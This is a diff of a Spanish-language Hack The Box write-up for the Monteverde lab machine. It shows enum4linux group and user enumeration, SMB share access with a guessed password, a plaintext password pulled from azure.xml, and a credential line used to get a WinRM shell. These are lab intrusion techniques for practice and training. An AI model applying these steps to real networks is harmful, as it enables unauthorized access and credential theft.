-group:<span class="o">[</span>Allowed RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23b<span class="o">]</span>
-group:<span class="o">[</span>Denied RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23c<span class="o">]</span>
-group:<span class="o">[</span>DnsAdmins<span class="o">]</span> rid:<span class="o">[</span>0x44d<span class="o">]</span>
-group:<span class="o">[</span>SQLServer2005SQLBrowserUser<span class="nv">$MONTEVERDE</span><span class="o">]</span> rid:<span class="o">[</span>0x44f<span class="o">]</span>
-group:<span class="o">[</span>ADSyncAdmins<span class="o">]</span> rid:<span class="o">[</span>0x451<span class="o">]</span>
-group:<span class="o">[</span>ADSyncOperators<span class="o">]</span> rid:<span class="o">[</span>0x452<span class="o">]</span>
-group:<span class="o">[</span>ADSyncBrowse<span class="o">]</span> rid:<span class="o">[</span>0x453<span class="o">]</span>
-group:<span class="o">[</span>ADSyncPasswordSet<span class="o">]</span> rid:<span class="o">[</span>0x454<span class="o">]</span>
-
-<span class="o">[</span>+<span class="o">]</span> Getting <span class="nb">local</span> group memberships:
-Group <span class="s1">&#39;ADSyncAdmins&#39;</span> <span class="o">(</span>RID: 1105<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
-</span><span class="s1">Group &#39;</span>Denied RODC Password Replication Group<span class="s1">&#39; (RID: 572) has member: Couldn&#39;</span>t lookup SIDs
-
-<span class="o">[</span>+<span class="o">]</span> Getting domain groups:
-group:<span class="o">[</span>Enterprise Read-only Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x1f2<span class="o">]</span>
-group:<span class="o">[</span>Domain Users<span class="o">]</span> rid:<span class="o">[</span>0x201<span class="o">]</span>
-group:<span class="o">[</span>Domain Guests<span class="o">]</span> rid:<span class="o">[</span>0x202<span class="o">]</span>
-group:<span class="o">[</span>Domain Computers<span class="o">]</span> rid:<span class="o">[</span>0x203<span class="o">]</span>
-group:<span class="o">[</span>Group Policy Creator Owners<span class="o">]</span> rid:<span class="o">[</span>0x208<span class="o">]</span>
-group:<span class="o">[</span>Cloneable Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x20a<span class="o">]</span>
-group:<span class="o">[</span>Protected Users<span class="o">]</span> rid:<span class="o">[</span>0x20d<span class="o">]</span>
-group:<span class="o">[</span>DnsUpdateProxy<span class="o">]</span> rid:<span class="o">[</span>0x44e<span class="o">]</span>
-group:<span class="o">[</span>Azure Admins<span class="o">]</span> rid:<span class="o">[</span>0xa29<span class="o">]</span>
-group:<span class="o">[</span>File Server Admins<span class="o">]</span> rid:<span class="o">[</span>0xa2e<span class="o">]</span>
-group:<span class="o">[</span>Call Recording Admins<span class="o">]</span> rid:<span class="o">[</span>0xa2f<span class="o">]</span>
-group:<span class="o">[</span>Reception<span class="o">]</span> rid:<span class="o">[</span>0xa30<span class="o">]</span>
-group:<span class="o">[</span>Operations<span class="o">]</span> rid:<span class="o">[</span>0xa31<span class="o">]</span>
-group:<span class="o">[</span>Trading<span class="o">]</span> rid:<span class="o">[</span>0xa32<span class="o">]</span>
-group:<span class="o">[</span>HelpDesk<span class="o">]</span> rid:<span class="o">[</span>0xa33<span class="o">]</span>
-group:<span class="o">[</span>Developers<span class="o">]</span> rid:<span class="o">[</span>0xa34<span class="o">]</span>
-
-<span class="o">[</span>+<span class="o">]</span> Getting domain group memberships:
-Group <span class="s1">&#39;HelpDesk&#39;</span> <span class="o">(</span>RID: 2611<span class="o">)</span> has member: MEGABANK<span class="se">\r</span>oleary
-Group <span class="s1">&#39;Trading&#39;</span> <span class="o">(</span>RID: 2610<span class="o">)</span> has member: MEGABANK<span class="se">\d</span>galanos
-Group <span class="s1">&#39;Operations&#39;</span> <span class="o">(</span>RID: 2609<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>morgan
-Group <span class="s1">&#39;Azure Admins&#39;</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator
-Group <span class="s1">&#39;Azure Admins&#39;</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>AD_987d7f2f57d2
-Group <span class="s1">&#39;Azure Admins&#39;</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\m</span>hope
-Group <span class="s1">&#39;Domain Guests&#39;</span> <span class="o">(</span>RID: 514<span class="o">)</span> has member: MEGABANK<span class="se">\G</span>uest
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\k</span>rbtgt
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>AD_987d7f2f57d2
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\m</span>hope
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\S</span>ABatchJobs
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-ata
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-bexec
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-netapp
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\d</span>galanos
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\r</span>oleary
-Group <span class="s1">&#39;Domain Users&#39;</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>morgan
-Group <span class="s1">&#39;Group Policy Creator Owners&#39;</span> <span class="o">(</span>RID: 520<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator
-
- <span class="o">=======================================================================</span> 
-<span class="p">|</span>    Users on 10.10.10.172 via RID cycling <span class="o">(</span>RIDS: 500-550,1000-1050<span class="o">)</span>    <span class="p">|</span>
- <span class="o">=======================================================================</span> 
-<span class="o">[</span>E<span class="o">]</span> Couldn<span class="err">&#39;</span>t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
-
- <span class="o">=============================================</span> 
-<span class="p">|</span>    Getting printer info <span class="k">for</span> 10.10.10.172    <span class="p">|</span>
- <span class="o">=============================================</span> 
-Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
-enum4linux <span class="nb">complete</span> on Sat Jan <span class="m">18</span> 19:19:29 <span class="m">2020</span>
+<span class="o">[</span> ... REDACTED ... <span class="o">]</span> 
 </code></pre></td></tr></table>
 </div>
-</div><p>Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar a entrar en la maquina.</p>
+</div><p>Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar.</p>
 <h2 id="smbmap-">SMBMAP</h2>
 <p>Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.</p>
 <div class="highlight"><div class="chroma">
@@ -2442,49 +2372,102 @@ svc-bexec
 </code></pre></td></tr></table>
 </div>
 </div><p>Vemos que el usuario SABatchJobs tiene permisos de Lectura en <strong>azure_uploads</strong> y <strong>users$</strong>.</p>
-<h1 id="user-mhope---azure-psadpasswordcredential">USER mhope - Azure PSADPasswordCredential</h1>
+<h1 id="user-mhope">USER MHOPE</h1>
+<h2 id="azure-psadpasswordcredential">Azure PSADPasswordCredential</h2>
 <p>Utilizamos las credenciales para enumerar <code>users$</code> con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.</p>
-<pre><code>root@aoiri:~/htb/monteverde# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
-Enter WORKGROUP\SABatchJobs's password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; dir
-  .                                   D        0  Fri Jan  3 07:12:48 2020
-  ..                                  D        0  Fri Jan  3 07:12:48 2020
-  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
-  mhope                               D        0  Fri Jan  3 07:41:18 2020
-  roleary                             D        0  Fri Jan  3 07:10:30 2020
-  smorgan                             D        0  Fri Jan  3 07:10:24 2020
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/htb/monteverde# smbclient <span class="se">\\\\</span>10.10.10.172<span class="se">\\</span>users$ -U SABatchJobs
+Enter WORKGROUP<span class="se">\S</span>ABatchJobs<span class="err">&#39;</span>s password: 
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> dir
+  .                                   D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:12:48 <span class="m">2020</span>
+  ..                                  D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:12:48 <span class="m">2020</span>
+  dgalanos                            D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:12:30 <span class="m">2020</span>
+  mhope                               D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:41:18 <span class="m">2020</span>
+  roleary                             D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:10:30 <span class="m">2020</span>
+  smorgan                             D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:10:24 <span class="m">2020</span>
 
-		524031 blocks of size 4096. 519955 blocks available
-smb: \&gt; cd mhope
-smb: \mhope\&gt; dir
-  .                                   D        0  Fri Jan  3 07:41:18 2020
-  ..                                  D        0  Fri Jan  3 07:41:18 2020
-  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020
+		<span class="m">524031</span> blocks of size 4096. <span class="m">519955</span> blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd</span> mhope
+smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> dir
+  .                                   D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:41:18 <span class="m">2020</span>
+  ..                                  D        <span class="m">0</span>  Fri Jan  <span class="m">3</span> 07:41:18 <span class="m">2020</span>
+  azure.xml                          AR     <span class="m">1212</span>  Fri Jan  <span class="m">3</span> 07:40:23 <span class="m">2020</span>
 
-		524031 blocks of size 4096. 519955 blocks available
-smb: \mhope\&gt; get azure.xml 
-getting file \mhope\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
-smb: \mhope\&gt; exit
+		<span class="m">524031</span> blocks of size 4096. <span class="m">519955</span> blocks available
+smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> get azure.xml 
+getting file <span class="se">\m</span>hope<span class="se">\a</span>zure.xml of size <span class="m">1212</span> as azure.xml <span class="o">(</span>1.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.4 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> <span class="nb">exit</span>
 root@aoiri:~/htb/monteverde# cat azure.xml 
-��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
-  &lt;Obj RefId=&quot;0&quot;&gt;
-    &lt;TN RefId=&quot;0&quot;&gt;
+��&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">&#34;1.1.0.1&#34;</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
+  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">&#34;0&#34;</span>&gt;
+    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">&#34;0&#34;</span>&gt;
       &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
       &lt;T&gt;System.Object&lt;/T&gt;
     &lt;/TN&gt;
     &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
     &lt;Props&gt;
-      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
-      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
-      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
-      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">&#34;StartDate&#34;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">&#34;EndDate&#34;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">&#34;KeyId&#34;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">&#34;Password&#34;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;
     &lt;/Props&gt;
   &lt;/Obj&gt;
 &lt;/Objs&gt;
-</code></pre><pre><code>Credenciales:
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">Credenciales:
 mhope:4n0therD4y@n0th3r$
-</code></pre><h2 id="evilwinrm">EvilWinRm</h2>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="evilwinrm">EvilWinRm</h2>
 <p>Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag <strong>user.txt</strong>.</p>
 <p><img src="/images/posts/htb/monteverde/Screenshot_20200120_182009.webp" alt="image" /></p>
 <h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
@@ -2660,7 +2643,7 @@ Kerberos support <span class="k">for</span> Dynamic Access Control on this devic
       
     
       
-        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fmonteverde%2f&title=Hack%20The%20Box%20-%20Monteverde &summary=&source=Walkthrough%20%3a%3a%20Writeups%20de%20rooms%20y%20maquinas%20de%20TryHackMe%2c%20HackTheBox%20y%20CTFs%2c%20en%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fmonteverde%2f&title=Hack%20The%20Box%20-%20Monteverde &summary=Monteverde%20expone%20SMB%20y%20LDAP%20donde%20obtuvimos%20una%20lista%20de%20usuarios%20los%20cuales%20utilizamos%20como%20contrase%c3%b1a%20para%20enumerar%20SMB%20y%20obtener%20credenciales%20almacenadas%20que%20nos%20dieron%20acceso%20por%20WinRM.%20El%20usuario%20pertenece%20al%20grupo%20Azure%20Admins%20lo%20que%20permitio%20conectarnos%20a%20la%20base%20de%20datos%20y%20obtener%20credenciales%20para%20obtener%20acceso%20privilegiado.&source=Walkthrough%20-%20Writeups%20%3a%3a%20TryHackMe%2c%20HackTheBox%2c%20CTFs%2c%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
           <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
         </a>
       
@@ -3999,8 +3982,9 @@ var a = document.getElementsByClassName('navbar__menu-item')
         <li><a href="#smbmap-">SMBMAP</a></li>
       </ul>
     </li>
-    <li><a href="#user-mhope---azure-psadpasswordcredential">USER mhope - Azure PSADPasswordCredential</a>
+    <li><a href="#user-mhope">USER MHOPE</a>
       <ul>
+        <li><a href="#azure-psadpasswordcredential">Azure PSADPasswordCredential</a></li>
         <li><a href="#evilwinrm">EvilWinRm</a></li>
       </ul>
     </li>
